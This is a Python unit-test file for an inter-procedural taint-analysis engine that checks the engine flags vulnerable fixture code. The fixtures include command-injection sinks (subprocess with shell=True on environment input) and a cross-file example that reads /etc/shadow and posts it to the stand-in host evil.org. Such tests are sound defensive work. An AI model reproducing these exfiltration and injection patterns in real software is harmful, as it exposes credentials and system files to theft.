# tests/test_cpg_taint_propagation.py
"""
Unit and integration tests for InterProceduralTaintEngine in CPG.
Tests intra-file, cross-file caller argument, and cross-file return value
taint propagation across modules, along with sanitization.
"""

import tempfile
import unittest
from pathlib import Path

from models.audit.tools.cpg.builder import CPGBuilder
from models.audit.tools.cpg.slicer import CPGEvidenceSlicer
from models.audit.tools.cpg.taint_engine import InterProceduralTaintEngine


class TestCPGTaintPropagation(unittest.TestCase):
    """Test suite for inter-procedural taint propagation."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name)

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_intra_file_taint_to_cmd_sink(self):
        code = (
            "import os, subprocess\n"
            "def handle_request():\n"
            "    user_input = os.environ.get('USER_INPUT')\n"
            "    cmd = 'echo ' + user_input\n"
            "    subprocess.run(cmd, shell=True)\n"
        )
        (self.root / "app.py").write_text(code, encoding="utf-8")

        builder = CPGBuilder(workspace_roots=[str(self.root)])
        cpg = builder.build()
        engine = InterProceduralTaintEngine(cpg)
        violations = engine.analyze()

        self.assertGreaterEqual(len(violations), 1)
        v = violations[0]
        self.assertEqual(v.rule_id, "CMD_001")
        self.assertFalse(v.is_cross_file)
        self.assertFalse(v.is_microservice)

        slicer = CPGEvidenceSlicer()
        steps = slicer.compress_trajectory(v)
        self.assertGreaterEqual(len(steps), 2)
        formatted = slicer.format_trajectory_block(steps)
        self.assertIn("[Deep Audit Inter-Procedural Taint Trajectory]", formatted)
        self.assertIn("SOURCE", formatted)
        self.assertIn("SINK", formatted)

    def test_cross_file_call_argument_taint(self):
        # File 1: executor.py (callee)
        (self.root / "executor.py").write_text(
            "import subprocess\n"
            "def execute_command(target):\n"
            "    subprocess.Popen(target, shell=True)\n",
            encoding="utf-8",
        )

        # File 2: entrypoint.py (caller)
        (self.root / "entrypoint.py").write_text(
            "import os\n"
            "from executor import execute_command\n"
            "def run():\n"
            "    token = os.getenv('SECRET_AUTH')\n"
            "    execute_command(token)\n",
            encoding="utf-8",
        )

        builder = CPGBuilder(workspace_roots=[str(self.root)])
        cpg = builder.build()
        engine = InterProceduralTaintEngine(cpg)
        violations = engine.analyze()

        self.assertGreaterEqual(len(violations), 1)
        v = violations[0]
        self.assertEqual(v.rule_id, "CMD_001")
        self.assertTrue(v.is_cross_file)
        self.assertFalse(v.is_microservice)

        slicer = CPGEvidenceSlicer()
        steps = slicer.compress_trajectory(v)
        step_types = [s["type"] for s in steps]
        self.assertTrue(any("SOURCE" in t for t in step_types))
        self.assertTrue(any("INTER_PROC_CALL" in t for t in step_types))
        self.assertTrue(any("SINK" in t for t in step_types))

        # Test multi-file context slicing
        context = slicer.extract_multi_file_context(v)
        self.assertIn("executor.py", context)
        self.assertIn("entrypoint.py", context)

    def test_cross_file_return_value_exfiltration(self):
        # File 1: loader.py (callee)
        (self.root / "loader.py").write_text(
            "def load_secrets():\n"
            "    data = open('/etc/shadow').read()\n"
            "    return data\n",
            encoding="utf-8",
        )

        # File 2: reporter.py (caller)
        (self.root / "reporter.py").write_text(
            "import requests\n"
            "from loader import load_secrets\n"
            "def report():\n"
            "    content = load_secrets()\n"
            "    requests.post('https://evil.org/log', data=content)\n",
            encoding="utf-8",
        )

        builder = CPGBuilder(workspace_roots=[str(self.root)])
        cpg = builder.build()
        engine = InterProceduralTaintEngine(cpg)
        violations = engine.analyze()

        self.assertGreaterEqual(len(violations), 1)
        v = violations[0]
        self.assertEqual(v.rule_id, "EXF_001")
        self.assertTrue(v.is_cross_file)

    def test_sanitizer_blocks_taint(self):
        (self.root / "sanitizer_app.py").write_text(
            "import os, hashlib, requests\n"
            "def safe_pipeline():\n"
            "    token = os.environ.get('TOKEN')\n"
            "    digest = hashlib.sha256(token.encode()).hexdigest()\n"
            "    requests.post('https://api.example.com/log', data=digest)\n",
            encoding="utf-8",
        )

        builder = CPGBuilder(workspace_roots=[str(self.root)])
        cpg = builder.build()
        engine = InterProceduralTaintEngine(cpg)
        violations = engine.analyze()

        # Because hashlib.sha256 is an irreversible sanitizer, no EXF_001 violation should be produced
        self.assertEqual(len(violations), 0)

    def test_raw_data_to_emb_sink(self):
        (self.root / "embed.py").write_text(
            "import torch\n"
            "def train():\n"
            "    raw_data = load_creditcard_records('/path/data.csv')\n"
            "    torch.save(raw_data, 'model.pt')\n",
            encoding="utf-8",
        )

        builder = CPGBuilder(workspace_roots=[str(self.root)])
        cpg = builder.build()
        engine = InterProceduralTaintEngine(cpg)
        violations = engine.analyze()

        self.assertGreaterEqual(len(violations), 1)
        self.assertEqual(violations[0].rule_id, "EMB_001")


if __name__ == "__main__":
    unittest.main()
